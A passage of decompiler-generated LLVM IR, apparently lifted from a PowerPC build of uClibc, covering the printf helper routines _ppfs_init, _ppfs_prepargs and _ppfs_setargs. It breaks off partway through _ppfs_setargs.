  store i32 %v2_1001aa0c, i32* @r29, align 4
  store i32 %v2_1001a92c, i32* @r4, align 4
  store i32 %v2_1001a930, i32* @r6, align 4
  store i32 %v2_1001aa0c, i32* @r3, align 4
  store i32 %v0_1001ab74, i32* @r5, align 4
  br i1 %v3_1001ab5c, label %dec_label_pc_1001ab7c, label %dec_label_pc_1001ab24

dec_label_pc_1001ab7c:                            ; preds = %dec_label_pc_1001ab5c, %dec_label_pc_1001ab0c.thread, %dec_label_pc_1001ab0c
  %v0_1001ab7c = load i32, i32* @r24, align 4
  %v0_1001ab84 = load i32, i32* @r28, align 4
  store i32 268544908, i32* @lr, align 4
  %v4_1001ab88 = call i32 @_charpad(i32 %v0_1001ab7c, i8 32, i32 %v0_1001ab84)
  %v1_1001ab8c = load i32, i32* @r28, align 4
  %v4_1001ab8c = icmp eq i32 %v4_1001ab88, %v1_1001ab8c
  br i1 %v4_1001ab8c, label %dec_label_pc_1001ab94, label %dec_label_pc_1001aba8

dec_label_pc_1001ab94:                            ; preds = %dec_label_pc_1001ab7c, %dec_label_pc_1001a8e4, %dec_label_pc_1001a6b8
  %stack_var_-184.2 = phi i32 [ %v0_1001a7ec, %dec_label_pc_1001a6b8 ], [ %stack_var_-184.1, %dec_label_pc_1001ab7c ], [ %v0_1001a7ec, %dec_label_pc_1001a8e4 ]
  %v3_1001ab94 = load i8*, i8** %stack_var_-200, align 4
  %v4_1001ab94 = ptrtoint i8* %v3_1001ab94 to i32
  store i32 %v4_1001ab94, i32* @r29, align 4
  br label %dec_label_pc_1001ab98

dec_label_pc_1001ab98:                            ; preds = %dec_label_pc_1001a5ac, %dec_label_pc_1001ab94
  %v0_1001ab98 = phi i32 [ %v0_1001ab98.pre, %dec_label_pc_1001a5ac ], [ %v4_1001ab94, %dec_label_pc_1001ab94 ]
  %v0_1001a7ec = phi i32 [ %tmp56, %dec_label_pc_1001a5ac ], [ %stack_var_-184.2, %dec_label_pc_1001ab94 ]
  br label %dec_label_pc_1001a5c4

dec_label_pc_1001aba8:                            ; preds = %dec_label_pc_1001aa00, %dec_label_pc_1001ab7c, %dec_label_pc_1001ab0c, %dec_label_pc_1001aab8, %dec_label_pc_1001aa9c, %dec_label_pc_1001a95c, %dec_label_pc_1001a92c, %dec_label_pc_1001a8c0, %dec_label_pc_1001a600, %dec_label_pc_1001ab50
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1001abac

dec_label_pc_1001abac:                            ; preds = %dec_label_pc_1001a60c, %dec_label_pc_1001a584, %dec_label_pc_1001a59c, %dec_label_pc_1001aba8
  store i32 %v0_1001a558, i32* %r0.global-to-local, align 4
  %v0_1001abb0 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_1001abb0

; uselistorder directives
  uselistorder i32 %v0_1001a7ec, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_1001ab74, { 1, 2, 0 }
  uselistorder i32 %v1_1001aa88, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_1001aa18, { 1, 0 }
  uselistorder i32 %v2_1001a9a8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1001a908, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1001a7ec, { 1, 0 }
  uselistorder i32 %v6_1001a7a4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_1001a788, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1001a774, { 1, 0 }
  uselistorder i32 %v1_1001a718, { 1, 0 }
  uselistorder i1 %v2_1001a70c, { 1, 0 }
  uselistorder i32 %v0_1001a6bc, { 1, 0, 2 }
  uselistorder i32 %v1_1001a6a8, { 1, 0 }
  uselistorder i32 %v0_1001a6a0, { 1, 0 }
  uselistorder i32 %v1_1001a69c, { 1, 0 }
  uselistorder i32 %v1_1001a618, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1001a5e0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1001a5f0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_1001aa0c, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_1001a654, { 1, 2, 0 }
  uselistorder i32 %v4_1001a64c, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 2, 4, 3, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 1, 0, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 1, 0, 2, 5 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder label %dec_label_pc_1001abac, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1001aba8, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1001ab98, { 1, 0 }
  uselistorder label %dec_label_pc_1001ab7c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001ab50, { 1, 0 }
  uselistorder label %dec_label_pc_1001ab2c, { 1, 0 }
  uselistorder label %dec_label_pc_1001aab8, { 1, 0 }
  uselistorder label %dec_label_pc_1001aa90, { 1, 0 }
  uselistorder label %dec_label_pc_1001aa78, { 1, 0 }
  uselistorder label %dec_label_pc_1001aa64, { 1, 0 }
  uselistorder label %dec_label_pc_1001aa44, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001aa44thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1001aa38, { 1, 0 }
  uselistorder label %dec_label_pc_1001a9c8, { 1, 0 }
  uselistorder label %dec_label_pc_1001a9b4, { 1, 0 }
  uselistorder label %dec_label_pc_1001a92c, { 1, 0 }
  uselistorder label %dec_label_pc_1001a87c, { 1, 0 }
  uselistorder label %dec_label_pc_1001a864, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_1001a814, { 1, 0 }
  uselistorder label %dec_label_pc_1001a7f8, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1001a784, { 1, 0 }
  uselistorder label %dec_label_pc_1001a768, { 1, 0 }
  uselistorder label %dec_label_pc_1001a754, { 1, 0 }
  uselistorder label %dec_label_pc_1001a750, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001a724, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001a6ac, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1001a698.dec_label_pc_1001a698_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1001a670, { 1, 0 }
  uselistorder label %dec_label_pc_1001a60c, { 1, 0 }
  uselistorder label %dec_label_pc_1001a600, { 1, 0 }
  uselistorder label %dec_label_pc_1001a5c4, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_1001abc8 = load i32, i32* @lr, align 4
  store i32 %v0_1001abc8, i32* %r0.global-to-local, align 4
  store i32 160, i32* @r5, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1001abd8 = load i32, i32* @r4, align 4
  store i32 %v0_1001abd8, i32* @r30, align 4
  store i32 0, i32* @r4, align 4
  store i32 268545000, i32* @lr, align 4
  %v0_1001abe4 = call i32 @__GI_memset()
  %v0_1001abe8 = load i32, i32* @r31, align 4
  %v1_1001abe8 = add i32 %v0_1001abe8, 24
  %v2_1001abe8 = inttoptr i32 %v1_1001abe8 to i32*
  %v3_1001abe8 = load i32, i32* %v2_1001abe8, align 4
  store i32 %v3_1001abe8, i32* %r9.global-to-local, align 4
  store i32 9, i32* @r11, align 4
  %v0_1001abf0 = load i32, i32* @r30, align 4
  %v2_1001abf0 = inttoptr i32 %v0_1001abe8 to i32*
  store i32 %v0_1001abf0, i32* %v2_1001abf0, align 4
  %v0_1001abf4 = load i32, i32* @r11, align 4
  store i32 %v0_1001abf4, i32* %ctr.global-to-local, align 4
  %v0_1001abf8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001abf8 = add i32 %v0_1001abf8, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1001ac00 = load i32, i32* @r31, align 4
  %v2_1001ac00 = add i32 %v1_1001ac00, 24
  %v3_1001ac00 = inttoptr i32 %v2_1001ac00 to i32*
  store i32 %v1_1001abf8, i32* %v3_1001ac00, align 4
  %v0_1001ac04 = load i32, i32* @r31, align 4
  %v1_1001ac04 = add i32 %v0_1001ac04, 40
  store i32 %v1_1001ac04, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ac08

dec_label_pc_1001ac08:                            ; preds = %dec_label_pc_1001ac08, %entry
  %v1_1001ac08 = phi i32 [ %v1_1001ac0c, %dec_label_pc_1001ac08 ], [ %v1_1001ac04, %entry ]
  %v0_1001ac08 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001ac08 = inttoptr i32 %v1_1001ac08 to i32*
  store i32 %v0_1001ac08, i32* %v2_1001ac08, align 4
  %v0_1001ac0c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001ac0c = add i32 %v0_1001ac0c, 4
  store i32 %v1_1001ac0c, i32* %r9.global-to-local, align 4
  %v0_1001ac10 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001ac10 = add i32 %v0_1001ac10, -1
  store i32 %v1_1001ac10, i32* %ctr.global-to-local, align 4
  %v2_1001ac10 = icmp eq i32 %v1_1001ac10, 0
  br i1 %v2_1001ac10, label %dec_label_pc_1001ac14, label %dec_label_pc_1001ac08

dec_label_pc_1001ac14:                            ; preds = %dec_label_pc_1001ac08
  %v0_1001ac14 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001ac54

dec_label_pc_1001ac24:                            ; preds = %dec_label_pc_1001ac54
  %v3_1001ac5c = icmp eq i8 %v2_1001ac54, 37
  br i1 %v3_1001ac5c, label %dec_label_pc_1001ac28, label %dec_label_pc_1001ac50

dec_label_pc_1001ac28:                            ; preds = %dec_label_pc_1001ac24
  %v1_1001ac28 = add i32 %v0_1001ac28, 1
  %v2_1001ac28 = inttoptr i32 %v1_1001ac28 to i8*
  %v3_1001ac28 = load i8, i8* %v2_1001ac28, align 1
  %v4_1001ac28 = zext i8 %v3_1001ac28 to i32
  store i32 %v4_1001ac28, i32* %r0.global-to-local, align 4
  store i32 %v1_1001ac28, i32* %r9.global-to-local, align 4
  %v3_1001ac30 = icmp eq i8 %v3_1001ac28, 37
  br i1 %v3_1001ac30, label %dec_label_pc_1001ac50, label %dec_label_pc_1001ac38

dec_label_pc_1001ac38:                            ; preds = %dec_label_pc_1001ac28
  %v0_1001ac2c = load i32, i32* @r31, align 4
  %v2_1001ac38 = inttoptr i32 %v0_1001ac2c to i32*
  store i32 %v1_1001ac28, i32* %v2_1001ac38, align 4
  store i32 268545088, i32* @lr, align 4
  %v1_1001ac3c = load i32, i32* %r9.global-to-local, align 4
  %v3_1001ac3c = call i32 @_ppfs_parsespec(i32* %v2_1001ac38, i32 %v1_1001ac3c)
  %v1_1001ac40 = icmp slt i32 %v3_1001ac3c, 0
  br i1 %v1_1001ac40, label %dec_label_pc_1001ac6c, label %dec_label_pc_1001ac48

dec_label_pc_1001ac48:                            ; preds = %dec_label_pc_1001ac38
  %v0_1001ac48 = load i32, i32* @r31, align 4
  %v1_1001ac48 = inttoptr i32 %v0_1001ac48 to i32*
  %v2_1001ac48 = load i32, i32* %v1_1001ac48, align 4
  br label %dec_label_pc_1001ac54

dec_label_pc_1001ac50:                            ; preds = %dec_label_pc_1001ac24, %dec_label_pc_1001ac28
  %v0_1001ac50 = phi i32 [ %v0_1001ac28, %dec_label_pc_1001ac24 ], [ %v1_1001ac28, %dec_label_pc_1001ac28 ]
  %v1_1001ac50 = add i32 %v0_1001ac50, 1
  br label %dec_label_pc_1001ac54

dec_label_pc_1001ac54:                            ; preds = %dec_label_pc_1001ac48, %dec_label_pc_1001ac50, %dec_label_pc_1001ac14
  %v0_1001ac28 = phi i32 [ %v0_1001ac14, %dec_label_pc_1001ac14 ], [ %v1_1001ac50, %dec_label_pc_1001ac50 ], [ %v2_1001ac48, %dec_label_pc_1001ac48 ]
  store i32 %v0_1001ac28, i32* %r9.global-to-local, align 4
  %v1_1001ac54 = inttoptr i32 %v0_1001ac28 to i8*
  %v2_1001ac54 = load i8, i8* %v1_1001ac54, align 1
  %v3_1001ac54 = zext i8 %v2_1001ac54 to i32
  store i32 %v3_1001ac54, i32* %r0.global-to-local, align 4
  %v3_1001ac58 = icmp eq i8 %v2_1001ac54, 0
  br i1 %v3_1001ac58, label %dec_label_pc_1001ac64, label %dec_label_pc_1001ac24

dec_label_pc_1001ac64:                            ; preds = %dec_label_pc_1001ac54
  %v0_1001ac64 = load i32, i32* @r30, align 4
  %v1_1001ac64 = load i32, i32* @r31, align 4
  %v2_1001ac64 = inttoptr i32 %v1_1001ac64 to i32*
  store i32 %v0_1001ac64, i32* %v2_1001ac64, align 4
  br label %dec_label_pc_1001ac6c

dec_label_pc_1001ac6c:                            ; preds = %dec_label_pc_1001ac38, %dec_label_pc_1001ac64
  %storemerge = phi i32 [ 0, %dec_label_pc_1001ac64 ], [ -1, %dec_label_pc_1001ac38 ]
  store i32 %v0_1001abc8, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_1001ac54, { 1, 2, 0 }
  uselistorder i32 %v0_1001ac28, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1001ac10, { 1, 0 }
  uselistorder i32 %v1_1001ac0c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 (i32*, i32)* @_ppfs_parsespec, { 1, 0 }
  uselistorder label %dec_label_pc_1001ac6c, { 1, 0 }
  uselistorder label %dec_label_pc_1001ac54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001ac50, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1001ac80 = load i32, i32* @lr, align 4
  %v0_1001ac88 = load i32, i32* @r3, align 4
  store i32 %v0_1001ac88, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1001aca4 = add i32 %v0_1001ac88, 24
  %v2_1001aca4 = inttoptr i32 %v1_1001aca4 to i32*
  %v3_1001aca4 = load i32, i32* %v2_1001aca4, align 4
  store i32 %v3_1001aca4, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_1001aca4, 1
  br i1 %tmp4, label %dec_label_pc_1001acc8, label %dec_label_pc_1001acb0

dec_label_pc_1001acb0:                            ; preds = %entry
  %v2_1001acb0 = add i32 %v0_1001ac88, 8
  %v3_1001acb0 = inttoptr i32 %v2_1001acb0 to i32*
  store i32 0, i32* %v3_1001acb0, align 4
  %v0_1001acb4 = load i32, i32* @r30, align 4
  %v1_1001acb4 = load i32, i32* @r3, align 4
  %v2_1001acb4 = add i32 %v1_1001acb4, 28
  %v3_1001acb4 = inttoptr i32 %v2_1001acb4 to i32*
  store i32 %v0_1001acb4, i32* %v3_1001acb4, align 4
  %v0_1001acb8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001acb8 = load i32, i32* @r3, align 4
  %v2_1001acb8 = add i32 %v1_1001acb8, 24
  %v3_1001acb8 = inttoptr i32 %v2_1001acb8 to i32*
  store i32 %v0_1001acb8, i32* %v3_1001acb8, align 4
  %v0_1001acbc = load i32, i32* %r0.global-to-local, align 4
  %v1_1001acbc = load i32, i32* @r3, align 4
  %v2_1001acbc = add i32 %v1_1001acbc, 4
  %v3_1001acbc = inttoptr i32 %v2_1001acbc to i32*
  store i32 %v0_1001acbc, i32* %v3_1001acbc, align 4
  store i32 268545220, i32* @lr, align 4
  %v0_1001acc0 = call i32 @_ppfs_setargs()
  store i32 %v0_1001acc0, i32* %r3.global-to-local, align 4
  %v0_1001acc4 = load i32, i32* @r30, align 4
  %v1_1001acc4 = load i32, i32* @r31, align 4
  %v2_1001acc4 = add i32 %v1_1001acc4, 24
  %v3_1001acc4 = inttoptr i32 %v2_1001acc4 to i32*
  store i32 %v0_1001acc4, i32* %v3_1001acc4, align 4
  %v0_1001acd8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001acc8

dec_label_pc_1001acc8:                            ; preds = %entry, %dec_label_pc_1001acb0
  %v0_1001acd8 = phi i32 [ %v0_1001ac88, %entry ], [ %v0_1001acd8.pre, %dec_label_pc_1001acb0 ]
  store i32 %v0_1001ac80, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001acd8

; uselistorder directives
  uselistorder label %dec_label_pc_1001acc8, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1001acdc = load i32, i32* @r3, align 4
  %v1_1001acdc = add i32 %v0_1001acdc, 24
  %v2_1001acdc = inttoptr i32 %v1_1001acdc to i32*
  %v3_1001acdc = load i32, i32* %v2_1001acdc, align 4
  store i32 %v3_1001acdc, i32* %r0.global-to-local, align 4
  %v1_1001ace0 = add i32 %v0_1001acdc, 88
  store i32 %v1_1001ace0, i32* @r8, align 4
  %v1_1001ace4 = add i32 %v0_1001acdc, 8
  %v2_1001ace4 = inttoptr i32 %v1_1001ace4 to i32*
  %v3_1001ace4 = load i32, i32* %v2_1001ace4, align 4
  store i32 %v3_1001ace4, i32* %r9.global-to-local, align 4
  %v2_1001ace8 = icmp sgt i32 %v3_1001acdc, 0
  %v3_1001ace8 = icmp eq i32 %v3_1001acdc, 0
  store i1 %v2_1001ace8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1001ace8, label %dec_label_pc_1001acf0, label %dec_label_pc_1001aedc

dec_label_pc_1001acf0:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_1001acf4 = icmp ne i32 %v3_1001ace4, -2147483648
  %v4_1001acf4 = icmp eq i32 %v3_1001ace4, -2147483648
  store i1 %v3_1001acf4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1001acf4, label %dec_label_pc_1001acfc, label %dec_label_pc_1001ad3c

dec_label_pc_1001acfc:                            ; preds = %dec_label_pc_1001acf0
  %v1_1001acfc = add i32 %v0_1001acdc, 76
  %v2_1001acfc = inttoptr i32 %v1_1001acfc to i8*
  %v3_1001acfc = load i8, i8* %v2_1001acfc, align 1
  %v4_1001acfc = zext i8 %v3_1001acfc to i32
  store i32 %v4_1001acfc, i32* @r10, align 4
  store i32 %v1_1001acfc, i32* %r11.global-to-local, align 4
  %v2_1001ad04 = icmp ugt i8 %v3_1001acfc, 8
  store i1 %v2_1001ad04, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_1001acfc, 7
  br i1 %tmp, label %dec_label_pc_1001ad24, label %dec_label_pc_1001ad0c

dec_label_pc_1001ad0c:                            ; preds = %dec_label_pc_1001acfc
  %v1_1001ad0c = add i32 %v0_1001acdc, 84
  %v2_1001ad0c = inttoptr i32 %v1_1001ad0c to i32*
  %v3_1001ad0c = load i32, i32* %v2_1001ad0c, align 4
  %v1_1001ad10 = mul nuw nsw i32 %v4_1001acfc, 4
  %v2_1001ad14 = add i32 %v3_1001ad0c, %v1_1001ad10
  store i32 %v2_1001ad14, i32* %r9.global-to-local, align 4
  %v1_1001ad18 = add nuw nsw i32 %v4_1001acfc, 1
  store i32 %v1_1001ad18, i32* %r0.global-to-local, align 4
  %v1_1001ad1c = trunc i32 %v1_1001ad18 to i8
  store i8 %v1_1001ad1c, i8* %v2_1001acfc, align 1
  br label %dec_label_pc_1001ad30

dec_label_pc_1001ad24:                            ; preds = %dec_label_pc_1001acfc
  %v1_1001ad24 = add i32 %v0_1001acdc, 80
  %v2_1001ad24 = inttoptr i32 %v1_1001ad24 to i32*
  %v3_1001ad24 = load i32, i32* %v2_1001ad24, align 4
  store i32 %v3_1001ad24, i32* %r9.global-to-local, align 4
  %v1_1001ad28 = add i32 %v3_1001ad24, 4
  store i32 %v1_1001ad28, i32* %r0.global-to-local, align 4
  store i32 %v1_1001ad28, i32* %v2_1001ad24, align 4
  br label %dec_label_pc_1001ad30

dec_label_pc_1001ad30:                            ; preds = %dec_label_pc_1001ad0c, %dec_label_pc_1001ad24
  %v0_1001ad30 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001ad30 = inttoptr i32 %v0_1001ad30 to i32*
  %v2_1001ad30 = load i32, i32* %v1_1001ad30, align 4
  store i32 %v2_1001ad30, i32* %r0.global-to-local, align 4
  %v1_1001ad34 = load i32, i32* @r8, align 4
  %v2_1001ad34 = inttoptr i32 %v1_1001ad34 to i32*
  store i32 %v2_1001ad30, i32* %v2_1001ad34, align 4
  %v0_1001ad38 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001ad38 = load i32, i32* @r3, align 4
  %v2_1001ad38 = add i32 %v1_1001ad38, 8
  %v3_1001ad38 = inttoptr i32 %v2_1001ad38 to i32*
  store i32 %v0_1001ad38, i32* %v3_1001ad38, align 4
  %v0_1001ad3c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1001ad3c

dec_label_pc_1001ad3c:                            ; preds = %dec_label_pc_1001acf0, %dec_label_pc_1001ad30
  %v2_1001ad6c = phi i32 [ %v0_1001acdc, %dec_label_pc_1001acf0 ], [ %v0_1001ad3c.pre, %dec_label_pc_1001ad30 ]
  %v1_1001ad3c = add i32 %v2_1001ad6c, 4
  %v2_1001ad3c = inttoptr i32 %v1_1001ad3c to i32*
  %v3_1001ad3c = load i32, i32* %v2_1001ad3c, align 4
  store i32 %v3_1001ad3c, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_1001ad44 = icmp ne i32 %v3_1001ad3c, -2147483648
  %v4_1001ad44 = icmp eq i32 %v3_1001ad3c, -2147483648
  store i1 %v3_1001ad44, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1001ad44, label %dec_label_pc_1001ad4c, label %dec_label_pc_1001aecc.preheader

dec_label_pc_1001ad4c:                            ; preds = %dec_label_pc_1001ad3c
  %v1_1001ad4c = add i32 %v2_1001ad6c, 76
  %v2_1001ad4c = inttoptr i32 %v1_1001ad4c to i8*
  %v3_1001ad4c = load i8, i8* %v2_1001ad4c, align 1
  %v4_1001ad4c = zext i8 %v3_1001ad4c to i32
  store i32 %v4_1001ad4c, i32* @r10, align 4
  store i32 %v1_1001ad4c, i32* %r11.global-to-local, align 4
  %v2_1001ad54 = icmp ugt i8 %v3_1001ad4c, 8
  store i1 %v2_1001ad54, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_1001ad4c, 7
  br i1 %tmp22, label %dec_label_pc_1001ad74, label %dec_label_pc_1001ad5c

dec_label_pc_1001ad5c:                            ; preds = %dec_label_pc_1001ad4c
  %v1_1001ad5c = add i32 %v2_1001ad6c, 84
  %v2_1001ad5c = inttoptr i32 %v1_1001ad5c to i32*
  %v3_1001ad5c = load i32, i32* %v2_1001ad5c, align 4
  %v1_1001ad60 = mul nuw nsw i32 %v4_1001ad4c, 4
  %v2_1001ad64 = add i32 %v3_1001ad5c, %v1_1001ad60
  store i32 %v2_1001ad64, i32* %r9.global-to-local, align 4
  %v1_1001ad68 = add nuw nsw i32 %v4_1001ad4c, 1
  store i32 %v1_1001ad68, i32* %r0.global-to-local, align 4
  %v1_1001ad6c = trunc i32 %v1_1001ad68 to i8
  store i8 %v1_1001ad6c, i8* %v2_1001ad4c, align 1
  br label %dec_label_pc_1001ad80

dec_label_pc_1001ad74:                            ; preds = %dec_label_pc_1001ad4c
  %v1_1001ad74 = add i32 %v2_1001ad6c, 80
  %v2_1001ad74 = inttoptr i32 %v1_1001ad74 to i32*
  %v3_1001ad74 = load i32, i32* %v2_1001ad74, align 4
  store i32 %v3_1001ad74, i32* %r9.global-to-local, align 4
  %v1_1001ad78 = add i32 %v3_1001ad74, 4
  store i32 %v1_1001ad78, i32* %r0.global-to-local, align 4
  store i32 %v1_1001ad78, i32* %v2_1001ad74, align 4
  br label %dec_label_pc_1001ad80

dec_label_pc_1001ad80:                            ; preds = %dec_label_pc_1001ad5c, %dec_label_pc_1001ad74
  %v0_1001ad80 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001ad80 = inttoptr i32 %v0_1001ad80 to i32*
  %v2_1001ad80 = load i32, i32* %v1_1001ad80, align 4
  store i32 %v2_1001ad80, i32* %r0.global-to-local, align 4
  %v1_1001ad84 = load i32, i32* @r8, align 4
  %v2_1001ad84 = inttoptr i32 %v1_1001ad84 to i32*
  store i32 %v2_1001ad80, i32* %v2_1001ad84, align 4
  %v0_1001ad88 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001ad88 = load i32, i32* @r3, align 4
  %v2_1001ad88 = add i32 %v1_1001ad88, 4
  %v3_1001ad88 = inttoptr i32 %v2_1001ad88 to i32*
  store i32 %v0_1001ad88, i32* %v3_1001ad88, align 4
  %v0_1001aecc5.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1001aecc.preheader

dec_label_pc_1001aecc.preheader:                  ; preds = %dec_label_pc_1001ad3c, %dec_label_pc_1001ad80
  %v0_1001aecc5 = phi i32 [ %v2_1001ad6c, %dec_label_pc_1001ad3c ], [ %v0_1001aecc5.pre, %dec_label_pc_1001ad80 ]
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1001aecc6 = add i32 %v0_1001aecc5, 28
  %v2_1001aecc7 = inttoptr i32 %v1_1001aecc6 to i32*
  %v3_1001aecc8 = load i32, i32* %v2_1001aecc7, align 4
  store i32 %v3_1001aecc8, i32* %r0.global-to-local, align 4
  %v2_1001aed09 = icmp sgt i32 %v3_1001aecc8, 0
  %v3_1001aed010 = icmp slt i32 %v3_1001aecc8, 0
  store i1 %v3_1001aed010, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1001aed09, label %dec_label_pc_1001ad94, label %dec_label_pc_1001af1c

dec_label_pc_1001ad94:                            ; preds = %dec_label_pc_1001aecc.preheader, %dec_label_pc_1001aec8
  %v2_1001aea8 = phi i32 [ %v0_1001aecc, %dec_label_pc_1001aec8 ], [ %v0_1001aecc5, %dec_label_pc_1001aecc.preheader ]
  %v0_1001ad94 = phi i32 [ %v1_1001aec8, %dec_label_pc_1001aec8 ], [ 0, %dec_label_pc_1001aecc.preheader ]
  %v1_1001ad94 = mul i32 %v0_1001ad94, 4
  %v2_1001ad98 = add i32 %v1_1001ad94, %v2_1001aea8
  store i32 %v2_1001ad98, i32* %r9.global-to-local, align 4
  %v1_1001ad9c = add i32 %v2_1001ad98, 40
  %v2_1001ad9c = inttoptr i32 %v1_1001ad9c to i32*
  %v3_1001ad9c = load i32, i32* %v2_1001ad9c, align 4
  store i32 %v3_1001ad9c, i32* %r0.global-to-local, align 4
  %v2_1001ada0 = icmp sgt i32 %v3_1001ad9c, 8
  %v3_1001ada0 = icmp eq i32 %v3_1001ad9c, 8
  store i1 %v2_1001ada0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1001ada0, label %dec_label_pc_1001aec8, label %dec_label_pc_1001ada8

dec_label_pc_1001ada8:                            ; preds = %dec_label_pc_1001ad94
  %v1_1001ada8 = add i32 %v2_1001aea8, 76
  store i32 %v1_1001ada8, i32* @r10, align 4
  br i1 %v2_1001ada0, label %dec_label_pc_1001adc4, label %dec_label_pc_1001adb0

dec_label_pc_1001adb0:                            ; preds = %dec_label_pc_1001ada8
  %v2_1001adb0 = icmp sgt i32 %v3_1001ad9c, 2
  store i1 %v2_1001adb0, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_1001ad9c, 3
  br i1 %tmp23, label %dec_label_pc_1001ae8c, label %dec_label_pc_1001addc

dec_label_pc_1001adc4:                            ; preds = %dec_label_pc_1001ada8
  %v2_1001adc4 = icmp sgt i32 %v3_1001ad9c, 1024
  store i1 %v2_1001adc4, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_1001ad9c, 1025
